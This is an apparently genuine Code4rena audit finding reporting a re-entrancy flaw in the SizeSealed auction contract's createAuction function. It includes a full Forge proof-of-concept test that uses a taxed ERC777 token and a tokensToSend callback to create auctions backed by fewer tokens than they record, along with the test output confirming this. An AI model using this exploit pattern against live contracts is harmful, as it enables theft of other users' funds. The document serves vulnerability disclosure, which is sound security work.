## Tags

- bug
- 2 (Med Risk)
- downgraded by judge
- satisfactory
- selected for report
- sponsor confirmed
- M-04

# [Auction created by ERC777 Tokens with tax can be stolen by re-entrancy attack](https://github.com/code-423n4/2022-11-size-findings/issues/192) 

# Lines of code

https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L96-L102


# Vulnerability details

## Impact
The createAuction function lacks the check of re-entrancy. An attacker can use an ERC777 token with tax as the base token to create auctions. By registering ERC777TokensSender interface implementer in the ERC1820Registry contract, the attacker can re-enter the createAuction function and create more than one auction with less token. And the sum of the totalBaseAmount of these auctions will be greater than the token amount received by the SizeSealed contract. Finally, the attacker can take more money from the contract global pool which means stealing tokens from the other auctions and treasury.

## Proof of Concept
Forge test 
```
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.17;

import {Test} from "forge-std/Test.sol";

import {SizeSealedTest} from "./SizeSealed.t.sol";
import {ERC777} from "openzeppelin-contracts/contracts/token/ERC777/ERC777.sol";
import "openzeppelin-contracts/contracts/utils/introspection/IERC1820Registry.sol";
import {MockSeller} from "./mocks/MockSeller.sol";
import {MockERC20} from "./mocks/MockERC20.sol";

contract TaxERC777 is ERC777{
    uint32 tax = 50; // 50% tax rate

    constructor(string memory name_,
        string memory symbol_,
        address[] memory defaultOperators_) ERC777(name_, symbol_, defaultOperators_){}
    
    function mint(address rec, uint256 amount) external{
        super._mint(rec, amount, "", "", false);
    }

    function _beforeTokenTransfer(
        address operator,
        address from,
        address to,
        uint256 amount
    ) internal override {
        if(to == address(0)||from==address(0)){ return;}
        // tax just burn for test
        
    }

    function _send(
        address from,
        address to,
        uint256 amount,
        bytes memory userData,
        bytes memory operatorData,
        bool requireReceptionAck
    ) internal override {
        uint tax_amount = amount* tax / 100;
        _burn(from, tax_amount, "", "");
        super._send(from, to, amount-tax_amount, userData, operatorData, requireReceptionAck);
    }

}

contract Callback {
    MockSeller seller;
    uint128 baseToSell;

    uint256 reserveQuotePerBase = 0.5e6 * uint256(type(uint128).max) / 1e18;
    uint128 minimumBidQuote = 1e6;
    // Auction parameters (cliff unlock)
    uint32 startTime;
    uint32 endTime;
    uint32 unlockTime;
    uint32 unlockEnd;
    uint128 cliffPercent;

    uint8 entry = 0;
    uint128 amount_cut_tax;
    constructor(MockSeller _seller, uint128 _baseToSell, uint256 _reserveQuotePerBase, uint128 _minimumBidQuote, uint32 _startTime, uint32 _endTime, uint32 _unlockTime, uint32 _unlockEnd, uint128 _cliffPercent){
        seller = _seller;
        baseToSell = _baseToSell;
        reserveQuotePerBase = _reserveQuotePerBase;
        minimumBidQuote = _minimumBidQuote;
        startTime = _startTime;
        endTime = _endTime;
        unlockTime = _unlockTime;
        unlockEnd = _unlockEnd;
        cliffPercent = _cliffPercent;
    }
    function tokensToSend(address operator, address from, address to, uint256 amount, bytes calldata userData, bytes calldata operatorData) external{
        if(from==address(0) || to==address(0)){return;}
        if(entry == 0){
            entry += 1;
            amount_cut_tax = baseToSell / 2;
            seller.createAuction(
                amount_cut_tax, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent
            );
            return;
        }
        else if(entry == 1){
            entry += 1;
            ERC777(msg.sender).transferFrom(from, to, amount_cut_tax);
            return;
        }
        entry += 1;
        return;
        
    }
    function canImplementInterfaceForAddress(bytes32 interfaceHash, address addr) external view returns(bytes32){return keccak256(abi.encodePacked("ERC1820_ACCEPT_MAGIC"));}
}

contract MyTest is SizeSealedTest {
    
    IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    function testCreateAuctionFromErc777() public {
        TaxERC777 tax777Token;
        address[] memory addrme = new address[](1);
        addrme[0] = address(this);
        tax777Token = new TaxERC777("t7", "t7", addrme);
        
        seller = new MockSeller(address(auction), quoteToken, MockERC20(address(tax777Token)));
        Callback callbackImpl = new Callback(seller, baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent);

        // just without adding more function to MockSeller
        vm.startPrank(address(seller));
        _ERC1820_REGISTRY.setInterfaceImplementer(address(seller), keccak256("ERC777TokensSender"), address(callbackImpl));
        tax777Token.approve(address(callbackImpl), type(uint256).max);
        vm.stopPrank();
        seller.createAuction(
            baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent
        );
        uint auction_balance = tax777Token.balanceOf(address(auction));
        uint128 auction1_amount = get_auction_base_amount(1);
        uint128 auction2_amount = get_auction_base_amount(2);
        emit log_named_uint("auction balance", auction_balance);
        emit log_named_uint("auction 1 totalBaseAmount", auction1_amount);
        emit log_named_uint("auction 2 totalBaseAmount", auction2_amount);
        assertGt(auction1_amount+auction2_amount, auction_balance);
    }

    function get_auction_base_amount(uint id) private returns (uint128){
        (, ,AuctionParameters memory para) = auction.idToAuction(id);
        return para.totalBaseAmount;
    }
}
```

You should fork mainnet because the test needs to call the ERC1820Registry contract at `0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24`
```
forge test --match-test testCreateAuctionFromErc777 -vvvvv --fork-url XXXXXXXX
```

Test passed and print logs:
```
...
...
    ├─ [4900] SizeSealed::idToAuction(1) [staticcall]
    │   └─ ← (1657269193, 1657269253, 1657269293, 1657270193, 0), (0xbfFb01bB2DDb4EfA87cB78EeCB8115AFAe6d2032, 0, 340282366920938463463374607431768211455, 0), (0x3A1148FE01e3c4721D93fe8A36c2b5C29109B6ae, 0xCe71065D4017F316EC606Fe4422e11eB2c47c246, 170141183460469231731687303, 10000000000000000000, 1000000, 0x0000000000000000000000000000000000000000000000000000000000000000, (9128267825790407824510503980134927506541852140766882823704734293547670668960, 16146712025506556794526643103432719420453319699545331060391615514163464043902))
    ├─ [4900] SizeSealed::idToAuction(2) [staticcall]
    │   └─ ← (1657269193, 1657269253, 1657269293, 1657270193, 0), (0xbfFb01bB2DDb4EfA87cB78EeCB8115AFAe6d2032, 0, 340282366920938463463374607431768211455, 0), (0x3A1148FE01e3c4721D93fe8A36c2b5C29109B6ae, 0xCe71065D4017F316EC606Fe4422e11eB2c47c246, 170141183460469231731687303, 5000000000000000000, 1000000, 0x0000000000000000000000000000000000000000000000000000000000000000, (9128267825790407824510503980134927506541852140766882823704734293547670668960, 16146712025506556794526643103432719420453319699545331060391615514163464043902))
    ├─ emit log_named_uint(key: auction balance, val: 10000000000000000000)
    ├─ emit log_named_uint(key: auction 1 totalBaseAmount, val: 10000000000000000000)
    ├─ emit log_named_uint(key: auction 2 totalBaseAmount, val: 5000000000000000000)
    └─ ← ()

Test result: ok. 1 passed; 0 failed; finished in 7.64s
```

## Tools Used

foundry

## Recommended Mitigation Steps
check re-entrancy